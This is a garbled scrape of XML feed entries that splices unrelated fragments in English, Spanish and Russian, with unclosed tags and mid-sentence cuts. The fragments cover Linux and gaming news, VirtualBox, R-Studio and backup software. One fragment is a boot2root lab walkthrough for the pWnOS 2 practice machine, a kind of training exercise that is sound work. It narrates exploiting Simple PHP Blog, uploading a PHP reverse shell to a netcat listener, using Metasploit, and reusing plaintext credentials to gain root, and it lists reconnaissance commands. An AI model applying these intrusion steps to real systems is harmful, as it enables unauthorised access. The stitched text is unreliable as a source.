  <summary><![CDATA[R-Studio 6.1 Build 152019 Network Edition  Full R-Tools creates serious recovery software. R-Studio for  Windows can help relieve you of many types of stressful disk disasters,  including reformatted partitions, damaged disks and hard disks with bad sectors.  It has an advanced RAID reconstruction tool and a powerful text/hex editor. This  file recovery tool is nearly as complex and effective as professional data  recovery software and earns our TopTenREVIEWS Silver Award.R-Studio can easily recover all known file  types that have been deleted as long as the files have not been written over.  The software is compatible with all Windows operating systems back to Windows  9x, and it can create disk images. R-Tools provides utilities for all types of  recovery needs, from simple file deletion to network editions and technician  editions of the software for difficult data-loss disasters. The version we reviewed is uncomplicated enough  for most moderately tech-savvy users to handle, yet it also includes tools for  advanced users.

Is Aliyun OS really Linux? Android? A rip-off of both?
When Acer was ready to announce a new smartphone running Alibaba’s Aliyun operating system, Google responded with force. If it were to be released, Google would end its partnership with Acer, which uses Android for 90 percent of its smartphones.

Video Art: Experimental Animation and Video Techniques in Linux
Animation and video editing in Linux can be treacherous territory. Anyone who has tried working in these media probably has experienced the frustration of rendering a huge file for an hour only to see the program crash before the export is finished. A bevy of tools and applications for manipulating video exist for Linux, and some are more mature than others.  


Desktop


A Call for Common Sense
For years now, there has been a lot of talk about the “fractured” Linux Desktop environment.  It’s an easy argument to make, given the number of distros, desktop choices the user has and the number of apps that may perform the same function. 
[...] 
Previously I preferred a “clean” install of Gnome, uncluttered with KDE dependencies and apps but recently, I’ve had a change of heart
 


Five things Desktop Linux has to do to beat Windows 8
In 2007, thanks to netbooks and Vista, Linux briefly exploded onto the desktop.  Microsoft soon realized they were losing the low-end laptop market and they brought XP back from the dead and practically gave it away to original equipment manufacturers (OEM)s. It worked. Linux’s popularity receded.  In 2012, Microsoft is once more bringing out a dog of a desktop operating system, Windows 8, so desktop Linux will once more get a chance to shine… if it can. 


Linus Torvalds on the Linux desktop’s popularity problems
And here is where Torvalds disagrees. Torvalds wrote, “One of the core kernel rules has always been that we never ever break any external interfaces. That rule has been there since day one, although it’s gotten much more explicit only in the last few years. The fact that we break internal interfaces that are not visible to userland is totally irrelevant, and a total red herring.” 


Preview of ROSA Desktop 2012
The alpha version of what will become ROSA Desktop 2012 has been made available for download. It comes about a week later than planned, but that is no big deal. The most important thing is that it is here. Let the bug hunting begin! 
For those reading about ROSA Desktop for the first time, it is a desktop Linux distribution published by ROSA Laboratory, a Linux solutions provider based in Moscow, Russia. ROSA Desktop is actually the end-user version of ROSA Marathon Enterprise, the desktop edition for businesses.  


Torvalds pours scorn on De Icaza’s desktop claims
Linux creator Linus Torvalds has poured scorn on claims made by the co-founder of the GNOME Desktop project, Miguel de Icaza, that he (Torvalds) was in any way to blame for the lack of development in Linux desktop initiatives. 
De Icaza made the claim in his personal blog on August 29 when he wrote: “Linus, despite being a low-level kernel guy, set the tone for our community years ago when he dismissed binary compatibility for device drivers. The kernel people might have some valid reasons for it, and might have forced the industry to play by their rules, but the Desktop people did not have the power that the kernel people did. But we did keep the attitude.” 


Handbags drawn in dawn war in the Linux world
Torvalds said that Gnomes were in total denial about what their problem really is and were blaming everybody except themselves. 
De Icaza puffed that his involvement with Gnome stopped about five years ago, so it is unfair to the Gnome guys to attach my position to their project. 
But he claimed that the fact that kernel guys ruled Linux did stuff up everything for the rest. 
He said that Torvalds had a strong personality, and so do a lot of the people that surround him and like it or not, that influenced the attitudes of people. 
“My take is that you are brilliant, clever and funny, and you can also be mean and harsh. Many people tried to imitate you, but they were neither brilliant, clever or funny. They just turn out to be mean and harsh and this attitude spread on the mailing lists,” he wrote. 
He agreed that when it came to CORBA, both the KDE guys and GNOME had it wrong and the same applied to .NET.

Apple, Microsoft, VMware: Everyone’s building open-source software
At LinuxCon, the Linux Foundation’s annual North American technical conference, Jim Zemlin’s, the Foundation’s executive director said, “If you are going to master software development, you must master open source.” 
Why is it important for businesses to master open source? Zemlin said it’s because “Software is the future of IT. Hardware is important to enable software, but what I mean that the value that end-users sees from technology increasingly comes from the software.”

Intel’s new Clover Trail chip will support Android & Linux
When the “news” came out that Intel wouldn’t be supporting Linux on its new Atom CPU, Clover Trail, I didn’t buy it. This next-generation Intel Atom processor was always meant primarily for Windows 8; but with Intel’s x86 instruction set, it would also always support Android and Linux. 


Torvalds touts Linux’s advances in power, ARM and cell phones
Linus Torvalds rarely appears in public these days, and has little to say when he does. 
“There’s nothing interesting about me,” Torvalds asked, when asked along with his fellow panelists to name something interesting about himself that no one knows. “I’m in a bathrobe reading email. I read email and answers and merge code written by others.” 
His appearance at LinuxCon 2012 in San Diego yesterday was no different, but he did reveal a few interesting factoids after being questioned by the audience. 


How To Get Your Ph.D. Project Included In The Linux Kernel
The Linux kernel is the world’s largest collaborative development project. Almost 3,000 individual contributors work together to create and maintain an operating system kernel that works on everything from wristwatches and mobile phones to mainframes, along with all the peripherals imaginable for each platform. Linux creator Linus Torvalds sits at the top of a loose hierarchy of kernel maintainers and acts as final arbiter for what does or does not get included. 


The Future is Forever
It’s been a year since Kernel.org was hacked by intruders. Still no report publicly explaining what happened.  


Wait and watch on systemd
I have been pondering the systemd situation for a while. My biggest concern has been that Debian and Ubuntu have not made decisions to adopt it as default, especially when Fedora, OpenSUSE, Mageia, and others have. Maybe Red Hat Enterprise Linux (RHEL) 7 will include it as well. So it seems like on the init system level, two fragmented groups are emerging: those who use systemd and those who don’t. My second concern is the ability for a casual/intermediate user to transition from a systemd-using system to one that doesn’t use it. 


Why the Linux Foundation Works (and Why the OSDL Failed) [VIDEO]
Not all Open Source foundations are created equal. Over the last 15 years that I’ve been actively engaged in open source activities I’ve seen more than my fair share of open source foundations go bust. I’ve also seen a few do really well. 
Remember the OSDL? 
The OSDL was the pre-cursor to the Linux Foundation. It was an organization that I personally never really liked and neither did Oracle. Back in 2006, Wim Coekaerts (then the Director of Linux Engineering at Oracle) told methat OSDL was all about business and Oracle knew how to deal with the Linux community on its own.

NVIDIA Puts Out A New Driver Pre-Release (304.48)
NVIDIA has released a new Linux graphics driver in the 304.xx series, which means the GeForce 6/7 series support is still there, while adding in some new improvements.  


Nouveau Releases New Driver With PRIME Support
The xf86-video-nouveau 1.0.2 driver was released today to take advantage of the new capabilities of X.Org Server 1.13. 
Namely, xf86-video-nouveau 1.0.2 hooks into the platform bus support, support for shared pixmaps with its EXA acceleration back-end, pixmap tracking/updating support, DRI2 offloading support, and the RandR provider/capabilities support. These features are what’s being done to work towards Linux support for GPU hot-plugging and NVIDIA Optimus.

Best Linux Applications For Learning Foreign Languages
If you’re learning a foreign language, there is always the need to go beyond the standard textbooks and listening materials. Resources like CDs,DVDs, and even movies in that particular language help you become a good listener and communicator. Also, these days, there are plenty of software available that help you learn better and faster. On Linux too, there are many such applications that can push you further in your linguistic endeavors without you having to pay a single penny. Here is a list of the best ones.

I must admit I’m wading uncharted waters here. The fact I have some street credit with 3D design and rendering does not make me an expert on computer-aided design. Still, I probably have a decent sense of understanding how 2D/3D plans and draft should work.

Secure Your Network With pfSense
One of my first experiences with network security was building firewalls for small offices and Internet cafés. Our boss at the time was adamant that we use open source, and directed us to OpenBSD and “pf”, their packet filtering firewall. It was a good call. OpenBSD proved to be rock solid, and pf was easy to configure and easy to maintain. Fast-forward a little over a decade and I’ve just finished installing a new pf-based firewall, this time as an entire FreeBSD distribution called pfSense.

A Game Built On The Enlightenment Foundation Libraries
Aside from having an obscure name, making Escape From Booty Bay an interesting open-source game is that it’s built atop EFL, the Enlightenment Foundation Libraries. 
Escape From Booty Bay is built using the Enlightenment Foundation Libraries and is described as ” a physics puzzle game in which players operate a cannon to stop pirates escaping from the prison. As players advance through the game levels, difficulty increases and new challenges are placed, like firing against moving targets.”

Can Linux Succeed As A First-Rate Gaming Platform?
There’s been a discussion that organically started within the forums concerning whether Linux is a “very weak system for gaming”, with a variety of reasons being expressed by a number of different Linux users. There’s now more than 100 comments on the topic, but do you think Linux can succeed as a first-rate gaming platform?  


20 Most Exciting Linux Games for 2012
In terms of stability and flexibility, Linux blew away its proprietary counterparts a long time ago. What it sorely lacks is developer interest, especially in the gaming department. But there are signs of a major revival. To the delight of Linux gaming enthusiasts, EA started publishing games in Ubuntu Software Center in May 2012. Valve on the other hand is taking things to the next level by actively developing a Linux port of their popular game Left 4 Dead 2. To celebrate the occasion, we have put together a collection of 20 most exciting games for Linux (not essentially released in 2012 itself and in no particular order). Hope you like it. 


Valve’s Full Linux Push Talked About For February
Valve is expected to have the initial Steam Linux client available in the near future along with the Left 4 Dead 2 game in some form of beta, but a full-blown Linux push by Valve Software might not happen until around February. 
Gabe Newell has publicly said yes to having Steam on Linux this year and that the Linux beta will be soon, but I am hearing now that their official Linux push might not be until February of 2013.
 


Vote for Linux Games on Steam Greenlight
Steam Greenlight is a new system that uses community votes in picking some of the next games to be released on Steam. 
Developers post information, screenshots, and videos for their game and seek a critical mass of community support in order to get selected for distribution. Steam Greenlight also helps developers get feedback from potential customers and start creating an active community around their game as early in the development process as they like. 


Valve Shows Off Steam’s Big Picture
Valve is beginning to roll out the “Big Picture” mode today for their Steam game distribution client. 
Big Picture is the new user-interface Valve’s targeting as a full-screen mode for running Steam on your television set and other devices with very large displays. This is also leading to their eventual foray as a Linux-based gaming hardware console.  


Followup: It’s been a month – Still No Native Steam Client On Linux 
Isn’t it funny how the whole tech blog universe must light up with this perpetual cycle of unmitigated hype, hostility to lash out at anybody like me who calls “B.S.”, and then a month later: It never happened? 


Game engine Torque 3D will soon be free, open source
GarageGames will make its flagship engine, Torque 3D, available for free with an open source license in a few weeks, as part of the company’s efforts to realign its goals. 
The engine will be released to Github under the MIT free software license, offering Torque 3D 1.2′s complete source code and four starting templates. GarageGames’ Dave Wyand will lead open source development and oversee future updates.

Best Open Source Games
Linux gaming has acquired bigger dimensions lately, after the active involvement of well known commercial games developing studios and other independent efforts, but we should not forget to support the great selection of open source games that Gnome users can enjoy! 






Desktop Environments


Why I don’t like game rendering performance benchmarks
It’s benchmark season again and as I have raised some concerns about the results of the published benchmark, I was asked to properly explain my concerns without making it look like a rant. So this is what I try with this blog post. 
Given the results of the published benchmark, I could go “Wooohooo, KWin’s the fastest!”, but instead I raise concerns. I don’t see that in the data and I hope nobody else sees that in the published data. 


K Desktop Environment/KDE SC/Qt


5th release of KDE Telepathy Instant Messaging suite
The KDE Telepathy team is pleased to announce the fifth major release of the new KDE Instant Messaging suite. The immediately available 0.5 version brings polish in many places, better stability, 58 reported bugs fixed and some nice new features too, making the instant messaging experience in KDE Workspaces more pleasant and enjoyable. Special attention was given to the log viewer, which received improvements galore. 


nobody will do it for you (and therefore they will)

Indeed, in spite of the disbelief, people do realize that it is up to them to make things happen, that it is unrealistic to wait for it to magically occur at the hands of others and so they dig in and get it done, thankfully often with great joy. (Most of us working on Free software love what we do.)
 


supporting Randa 2012

The Randa meetings have hosted discussions on KDE’s libraries, Plasma, multimedia, messaging and more. 
These discussions resulted in significant decisions being made that were unlikely to be achieved with the quality and quickness experienced at such a meeting. Those decisions translated into improvements in our software … a lot of improvements. This time around the topics in focus are education, accessibility, multimedia and the Plasma Workspaces. Each of these four topics h]]></summary>

  <summary><![CDATA[¿Quieres probar un programa pero
 no te atreves por si dañas tu sistema operativo? ¿Te gustaría tener 
otro sistema operativo pero sin quitar el tuyo? ¿Imaginas probar Windows
 Vista desde tu XP? 
Todo esto es posible con VirtualBox, una utilidad gratuita que crea un 
ordenador virtual dentro del tuyo, con su sistema operativo totalmente 
independiente. 
De esta forma, podrás crear máquinas virtuales con diferentes sistemas
 operativos y así tener a tu disposición un Windows 95, un Vista, un 
2000 un XP o incluso un Linux. Todo desde tu sistema operativo actual. 
Para utilizarlo, primero deberás conseguir o crear tu mismo una máquina 
virtual del sistema operativo que desees, después, cargarla con el 
programa y listo, arrancará como si de un nuevo sistema operativo se 
tratase. Por cierto, el programa no ocupa demasiado, pero ten presente 
que las máquinas virtuales suelen ocupar bastante espacio, fácilmente de
 cuatro a seis gigabytes.
 Sistemas operativos virtuales 
 

Windows (98, NT 4.0, 2000, XP, Server 2003, Vista, Server 2008), DOS/Windows 3.x
Linux (Kernel 2.4 y 2.6), FreeBSD/OpenBSD, Solaris 10, OS/2, etc. Orangefiles

  <summary><![CDATA[LinksWatch video on-line: http://blip.tv/g0tmi1k/pwnos-2-php-6359801Download video: http://www.mediafire.com/?f1xdu5if3ftsi7h OverviewThis is the second release in the "pWnOS" vulnerable machine collection, however, it has a different creator from the previous one (which explains why it has a different "feel" to it). As always with "boot2root" machines, it has purposely built "issues" allowing for the machine to become compromised, with the end goal being to become the super user, "root". This method uses a vulnerability in a PHP web application (see here for exploiting via SQL injection).  MethodScanned the network to discover the target [Net Discover]Port scanned the target to determine the running services on the target [Unicorn Scan]Emulated the services by grabbing the banner/header of the running service(s) [NMap]Discovered a hidden web application [DirB]Located a public exploit for the out dated web application [Exploit-DB]Created an additional user that uploaded a PHP shell onto the target to gain remote command access into the system [Pentest Monkey PHP Shell]Automated the same attack [Metasploit]Located hard coded plain text credentials, which had been re-used, allowing for complete system access  ToolspWnOS_v2.0.7z (md5: 1eb0960c0ba29335230ada1df80cd22c)A virtual machine (Example: VMware Player or Virtual Box)Net Discover - (Can be found in BackTrack 5)Unicorn Scan - (Can be found in BackTrack 5)NMap - (Can be found in BackTrack 5)Firefox - (Can be found in BackTrack 5)cURL - (Can be found in BackTrack 5)Simple PHP Blog <= 0.4.0 Multiple Remote Exploits - (Can be found in BackTrack 5)php-reverse-shell - (Can be found in BackTrack 5)Netcat - (Can be found in BackTrack 5)Metasploit - (Can be found in BackTrack 5) Walk throughBy reading the readme file, "pWnOS_INFO-2_0.txt", the attacker soon learns not only the IP range which the target is using, they also now know the target's network configuration (it's using a static IP address of 10.10.10.100/24). The attacker confirms the given information, by sweeping the network range with "net discover", which only displays a single result that matches the specified IP from the readme file.   As soon as the attacker has updated their IP address to fit inside the target's subnet range, they try to discover what services the target is running. "Unicorn Scan" is able to quickly scan every port, both TCP and UDP, which belongs to the target. This shows that port TCP 22 (SSH) & TCP 80 (HTTP) are open. To verify the result, the attacker repeats port scanning all TCP ports with "nmap". An additional feature of nmap is its inbuilt scripting engine, which can emulate the services during the scan. This produces more relevant information about the target. Nmap confirms the same ports are open and which default port's numbers are used for their default services (for example, SSH service on port TCP 22 and a web server running on TCP 80). As SSH services are normally used to remotely execute commands, and due to their nature they normally require a form of authentication before access to the service is granted. This leaves the attacker to start with the web service.   When the attacker visits the default web application with "Firefox" to graphically render the code, they are presented a form to fill in to which leads to further access to use the web application. After navigating around the site, they only discover three pages: the login form, a place to register in order to be able to login, and a home page. The home page contains an email address, "admin@isints.com". This could mean "admin" is a possible username (which is very common), and the domain the target is connected to.    The attacker then starts to brute force various possible folders & filenames for common paths relating to web services by using "dirb". This displays three "interesting" results, "/includes", "/info", and "/blog". "/includes" contains pages relating to the source code, which are repeated throughout the web application (for example, the header and footer). When they looked at the code, the attacker is able to see the PHP code as the file extensions is ".html" and the web server isn't configured to process this file extension as server side code. "/info" is a page to show the output of "phpinfo()". (Editor's note: This file contains lots of useful information which would benefit the attacker as they would be able to understand the configuration of PHP on the system. However, I chose not to use this as a source of information, as this wasn't part of the vulnerable web application.)  After the attacker visits the URI of "/blog", they discover it has a hidden web application, which is meant for internal use for the company, "isints". By clicking around, they try to see if they can locate any private internal data which they can use to their advantage, however, they didn't notice anything. The attacker believes this wasn't a bespoke custom application like before, so they try to identify what application and its version. Upon viewing the home page source code, they discover it is "Simple PHP Blog 0.4".   The attacker re-runs dirb, however uses /blog as the default path, to see if there is any more hidden material located inside the application. This time, the attacker notices an "interesting" folder name, "/config". Using firefox they navigate to the folder and find it contains two files, "config.txt" and "password.txt". They both hold information which relates to their filename and the attacker downloads them both for an offline copy, in case they might be needed later.   The attacker takes their knowledge of the hidden web application and searches a public database of known exploits provided by "exploit-db" (to see if they are able to exploit the target's web application and version, simple php blog v0.4). They find six exploits which match simple php blog and of those results, one result matches the target's version. After checking the exploit code will run, as sometimes there are additional values added at the start of the file that would means the file isn't correctly executed, the attacker runs the exploit code. The code presents a help screen that shows which command line arguments are required, for what function, as the supports multiple exploit. The attacker starts the exploit code to display the hashes on the system, which they have already acquired. This allows for the attacker to see if they are issuing the commands correctly into the exploit. The response from the exploit shows the hashes match the same value that the attacker discovered when they used dirb. Next they add another user into the web application with a username and password of their choosing. After the exploit has successfully ran, the attacker logs into the blog by using firefox and the credentials which they set. The attacker has now been granted additional features, of which, one is the ability to upload files. This feature is meant for images only, however, the attacker opts to try and use "Pentest Monkey's PHP reserve shell", and see if it is disallowed (as it's not a valid image). After making a copy of the shell, updating it so it contains the attackers IP address, they then try and upload the shell. The blog forwards them back to the homepage and doesn't give any feedback if the upload was successful or if it failed. When dirb was scanned the /blog/ folder, it displayed the server contained a folder called "/images". As the attacker attempted to upload an image, they navigated to the folder. They discover that the upload appeared to be successful as there is a matching filename and size displayed. The attacker can test to see if the upload really was successful by running the shell. For the shell to correctly work there needs to be a listener waiting on the IP address and port which it was configured with. The attacker used their IP address, so they set up "netcat" locally to listen on TCP port "1234" to match the shell. Now when someone "views" the shell page on the target web server, it causes the PHP code to be executed, creating a connection from the target to the attacker, then afterwards execute a shell program to be interacted with. The result being the attacker has gained an interact shell on the target, allowing them to execute commands remotely. The attacker goes back to the exploit code and tries to see if that is able to automate gaining a shell as it is one of the payload options. However, it partly fails, but it still creates a new file on the target machine that allows for commands to be executed and displayed. The attacker tests out the automated backdoor, and issues a command to display the current user. The result shows they are able to issue commands on the system, as the web server.   The attacker goes back to their original shell as it is more interactive. They try to see if they are able to "upgrade" the newer shell, by using netcat. They find that it is installed on the system. However, the version which is installed, "OpenBSD", is not compatible with what they are trying at achieve as it doesn't support the "-e" argument, which allows for a program to be executed once a connection has been established, thus they are unable to upgrade it to an interactive shell using this method. They could however see if Perl, Python or Ruby is installed on the target and see if they could cause an improved shell. The attacker isn't worried about this as they already have an interactive shell via PHP. (Editor's note: The stage below is optional as they are a repeat of the method above, however, it is included as it automates the attack as well as being more stable.)The attacker then repeats exploiting the target, using the same vulnerability, however this time uses "metasploit" as it is able to automate various aspects of the exploitation stage. After starting up a metasploit console, they search to see if the exploit has been ported and included within the framework. Whereas exploit-db returned six exploits for simple php blog, metasploit only has one. However, this matches the same exploit as before (as it uses the same vulnerabilities). After setting up the environment for the exploit to be executed in (target's IP, path of the blog on the web server, payload to use, attacker's IP address & port), the attacker commands metasploit to trigger the exploit. After waiting for the exploit to complete (Editor's note: took about 30 seconds), the attacker now has a meterpeter shell on the target's machine. They then execute a few basic in-built commands (system information, current user and running processors) to meterpeter that starts emulating the target's operating system. The attacker places the current session into the background, as they wish to keep exploring metasploit features and modules. They then list all the current inbuilt exploits which when used locally can gain privileges, however, the ones currently in-built to metasploit the target isn't vulnerable to. Next they search post exploitable modules, which are designed to be executed once the attacker has a remote shell on the box. They start off looking at modules designed for just Linux systems, then modules which are able to be executed across different platforms. The attacker chooses to try out "system_sessions", which has a similar effect to what they were trying to manually do with netcat, causing another remote interactive shell. After checking to make sure all the options match the attacker's requirements, they make a listener, ready to catch the connection. Then they run the module. The result, the attacker now has three interactive shells on the system (as well as another method to execute commands), all using the same vulnerability.  The attacker goes back to the meterpeter shell on the target, and starts collecting information that might be useful and may aid them in discovering a method to escape privileges. To start with, they discover basic information relating to the operating system, such as: which user they are currently using (along with the user's group value), various information relating to the kernel (name, hostname, release, version, hardware name, processor type, hardware platform and operating system) and hostnames. Next they identify what operating system the target is using and its version. Afterwards they move onto what's currently happening on the target regarding current network connections and running processors. After that, they start to explore the target's file system and soon learn the current path they are in, what files exist in the web root folder and what files are in "/var" ("Normally" it's used for files which are "meant" to be changed when the operating system is generally running). Upon searching the filenames located on the target, the attacker saw an "interesting" filename, that was duplicated in the web folder and /var folders. They view the contents of the file; finding the file is used by the web server to interact with the database as the file has hard coded clear text credentials in it. However, the password values differ between the files.  From the port scan at the beginning and when they emulate the target (by its network activity and running processors), the attacker knows there is a SSH service running which allows for remote access into the system. By viewing the configuration of the SSH service they discover that "root" login is enabled. The username "root" matches the username inside the database files, so the attacker tries to SSH into the box using root as the username. They then match up the rest of the credentials from the database configuration with the password. The web root folder password fails, however, the password from /var, allows them to gain access into the system as the super user, root.  Game Over Commandsnetdiscover -r 10.10.10.0/24 ifconfig eth0 !! 10.10.10.43/24 ip=10.10.10.100 # target's IP us -mT -Iv $ip:a -r 3000 -R 3 && us -mU -Iv $ip:a -r 3000 -R 3 nmap -p 1-65535 -T4 -A -v $ip firefox $ip  cd /pentest/web/dirb/ ./dirb http://$ip # /blog # Hidden! # /includes # PHP tags # /info # phpinfo() # admin@isints.com # username?

  <title><![CDATA[Download VirtualBox 4.2 Oracle VM VirtualBox  Free]]></title>
  <summary><![CDATA[What is virtualBox:VirtualBox is a powerful x86 and AMD64/Intel64 virtualization product for enterprise as well as home use. Not only is VirtualBox an extremely feature rich, high performance product for enterprise customers, it is also the only professional solution that is freely available as Open Source Software under the terms of the GNU General Public License (GPL) version 2. See "About VirtualBox" for an introduction. Some of the features of VirtualBox are:Presently, VirtualBox runs on Windows, Linux, Macintosh, and Solaris hosts and supports a large number of guest operating systems including but not limited to Windows (NT 4.0, 2000, XP, Server 2003, Vista, Windows 7), DOS/Windows 3.x, Linux (2.4 and 2.6), Solaris and OpenSolaris, OS/2, and OpenBSD.   Modularity. VirtualBox has an extremely modular design with well-defined internal programming interfaces and a client/server design. This makes it easy to control it from several interfaces at once: for example, you can start a virtual machine in a typical virtual machine GUI and then control that machine from the command line, or possibly remotely. VirtualBox also comes with a full Software Development Kit: even though it is Open Source Software, you don't have to hack the source to write a new interface for VirtualBox. Virtual machine descriptions in XML. The configuration settings of virtual machines are stored entirely in XML and are independent of the local machines. Virtual machine definitions can therefore easily be ported to other computers.  Why is virtualization useful?The techniques and features that VirtualBox provides are useful for    several scenarios: Running multiple operating systems        simultaneously. VirtualBox allows you to run more than one        operating system at a time. This way, you can run software written for        one operating system on another (for example, Windows software on        Linux or a Mac) without having to reboot to use it. Since you can        configure what kinds of "virtual" hardware should be presented to each        such operating system, you can install an old operating system such as        DOS or OS/2 even if your real computer's hardware is no longer        supported by that operating system.Easier software installations.        Software vendors can use virtual machines to ship entire software        configurations. For example, installing a complete mail server        solution on a real machine can be a tedious task. With VirtualBox,        such a complex setup (then often called an "appliance") can be packed        into a virtual machine. Installing and running a mail server becomes        as easy as importing such an appliance into VirtualBox.Testing and disaster recovery.        Once installed, a virtual machine and its virtual hard disks can be        considered a "container" that can be arbitrarily frozen, woken up,        copied, backed up, and transported between hosts. On top of that, with the use of another VirtualBox feature        called "snapshots", one can save a particular state of a virtual        machine and revert back to that state, if necessary. This way, one can        freely experiment with a computing environment. If something goes        wrong (e.g. after installing misbehaving software or infecting the        guest with a virus), one can easily switch back to a previous snapshot        and avoid the need of frequent backups and restores. Any number of snapshots can be created, allowing you to travel        back and forward in virtual machine time. You can delete snapshots        while a VM is running to reclaim disk space.Infrastructure consolidation.        Virtualization can significantly reduce hardware and electricity        costs. Most of the time, computers today only use a fraction of their        potential power and run with low average system loads. A lot of        hardware resources as well as electricity is thereby wasted. So,        instead of running many such physical computers that are only        partially used, one can pack many virtual machines onto a few powerful        hosts and balance the loads between them.Download:VirtualBox platform packages.

  <title><![CDATA[Aumento de las plataformas soportadas para backup]]></title>
  <summary><![CDATA[La compañía ofrece novedades para Windows, Fedora, Mac OS X, Novell Open Enterprise Server, OpenBSD y Ubuntu. 

Arkeia Software, proveedor de soluciones de backup en red líderes por rapidez, facilidad de uso y coste, anuncia una actualización del soporte para diez plataformas. Esta decena es una pequeña parte de las más de doscientas plataformas protegidas por Arkeia Network Backup, incluyendo los sistemas operativos Windows, Mac, Linux, Netware, Solaris, AIX, BSD y HP-UX y sus variantes, así como los entornos virtuales VMware, Hyper-V y Xen. 
Al usar una única solución de backup de red a la hora de salvaguardar todas las plataformas se contribuye a reducir costes y complejidad, ya que solo se necesita gestionar un entorno y no se requiere compartir recursos de almacenamiento. El amplio soporte de plataformas maximiza la protección de datos porque es posible aplicar una misma política a todas las plataformas, ya sean físicas o virtuales, y emplear un solo mecanismo para trasladar datos ‘offsite’. 
El director general de Arkeia Software, Bill Evans, afirma que: “Arkeia ha sido reconocida mundialmente por haber sido la primera compañía en ofrecer una solución de backup en red profesional para Linux en 1999. Desde entonces, hemos extendido la gama de plataformas protegidas a más de doscientos pares de procesadores y sistemas operativos. Creemos que este amplio soporte es la mejor apuesta posible para soluciones de backup para las pequeñas y medianas empresas. Nuestros clientes también se benefician de la disminución de costes e incremento de fiabilidad al salvaguardar plataformas físicas y virtuales con una solución completa”. 
Esta interesante propuesta de Arkeia incluye el servicio de soporte a través de servidores de backup para múltiples generaciones de agentes de backup (normalmente durante ocho años). Este soporte, líder en la industria, permite a los clientes actualizar los servidores sin necesidad de tener que actualizar los agentes. En la actualidad, los servidores Arkeia v 9.1 soportan agentes para v9.0, v8.2, v8.1, v8.0, v7.0, v6.0, v5.3, v5.2 y v5.1. 
Esta compatibilidad ‘backward’ reduce los gastos al dotar a los administradores de control total en la elección de las actualizaciones de los agentes y Como un único servidor de backup Arkeia puede proteger cientos de clientes, es posible implantar versiones de agentes “mixtos”.  
Calendario de disponibilidad Próximas y recientes entregas de soporte de plataformas: 
• Servidores y agentes de backup Ubuntu 12.04 (Abril 2012) 
• Servidores y agentes de backup Fedora 17 (Mayo 2012) 
• Servidores y agentes de backup OpenBSD 5.1 (Mayo 2012) 
• Agentes de backup Mac OS X 10.8 (Agosto 2012) 
• Servidores multimedia y agentes de backup Windows Server 2012 (Septiembre 2012) 
• Agentes de backup Windows 8 (Septiembre 2012) 
• Servidores y agentes de backup Open Enterprise Server 11 SP1 (Septiembre 2012) 
• Servidores y agentes de backup openSUSE 12.2 (Septiembre 2012) 
• Servidores y agentes de backup Ubuntu 12.10 (Octubre 2012) 
• Servidores y agentes de backup Fedora 18 (Noviembre 2012) 
Los nuevos soportes, que estarán disponibles tras el lanzamiento general de sus correspondientes sistemas operativos, son gratuitos para aquellos clientes con contratos de mantenimiento en vigor. Los paquetes se pueden descargar directamente desde la página web de Arkeia (www.arkeia.com/software-downloads).]]></summary>

  <title><![CDATA[R-Studio 6.1]]></title>
  <summary><![CDATA[R-Studio es un software para la recuperación de datos borrados o dañados. Optimizada con una novedosa y genuina tecnología de recuperación de datos, esta herramienta representa la solución más completa de su género para recuperar archivos a partir de particiones FAT12/16/32/exFAT, NTFS, NTFS5 (creadas o actualizadas por Windows 2000/XP/2003/Vista/2008/Win7), HFS/HFS+ (Macintosh), las variantes Little y Big Endian de UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) y Ext2/Ext3/Ext4 FS (Linux).    La aplicación también permite la recuperación de archivos sin formato (exploración en busca de tipos de archivo conocidos) en sistemas de archivos seriamente dañados o desconocidos. Además, funciona en discos locales y de red, incluso si dichas particiones han sido formateadas, dañadas o eliminadas, y su configuración flexible ofrece un control absoluto al usuario sobre la recuperación de los datos.  Además de ser una herramienta completa de recuperación de datos, R-Studio también incluye:  Módulo avanzado de reconstrucción de RAID Editor de texto/hexadecimal con muchas funciones Módulo avanzado de copia/creación de imágenes de discos  Las herramientas de R-Studio recuperan archivos: Eliminados sin papelera o cuando la papelera ha sido vaciada; Eliminados por ataque de virus o corte de corriente eléctrica; Después de haber reformateado la partición con archivos, aun para distintos sistemas de archivos; Cuando la estructura de particiones del disco duro ha sido cambiada o dañada. En este caso las herramientas de R-Studio pueden escanear el disco duro intentando encontrar particiones que existían antes y recuperar sus archivos. Desde un disco duro con sectores dañados.   El software de recuperación de datos de R-Studio puede crear primero una imagen de disco o de su parte y después procesar este archivo de imagen. Es especialmente útil cuando en el disco duro aparecen constantemente sectores dañados y hace falta guardar inmediatamente la información que todavía no está dañada.  Caracterisricas: Compatible con RAID5 con retrasos de paridad, a menudo utilizados en los servidores HP.         R-Studio Agent, para los principales SO de PC: Windows, MacOS, Linux.  Exploración y creación simultánea de imágenes. Ahora, R-Studio puede crear una imagen y, al mismo tiempo, explorar los datos de dicha imagen. Como resultado, se crearán dos archivos en la misma ubicación: un archivo de imagen y un archivo con la información sobre la exploración.  Listas de recuperación de archivos: listas de archivos de los discos que se pueden exportar de R-Studio, editar manualmente y, a continuación, importarse de nuevo. Los archivos de estas listas se marcarán automáticamente para su recuperación. Dichas listas son realmente útiles si se necesita que alguien que está en un lugar distante decida qué archivos recuperar.    Comprobación de la coherencia RAID: es posible comprobar si los bloques de paridad de un RAID son válidos.         Los archivos de imagen y de información de la exploración se pueden guardar y cargar en equipos remotos. Esto evita que R-Studio tenga que transferir grandes volúmenes de datos a través de la red durante este proceso de recuperación.  Sistema operativo: Windows 2000/XP/2003/Vista/2008/7/8 Idioma: Español  Descarga:]]></summary>

Первоначально публикация проектов была бесплатной, что породило большое число поддельного материала в Steam Greenlight, но затем для решения проблемы компания ввела условный взнос в размере $100. 	 	             2012-09-14 13:47    Сайт облачного сервиса iCloud вышел из стадии бета-тестирования        	 	 	Apple сообщила о том, что сайт облачного сервиса iCloud вышел из стадии бета-тестирования.

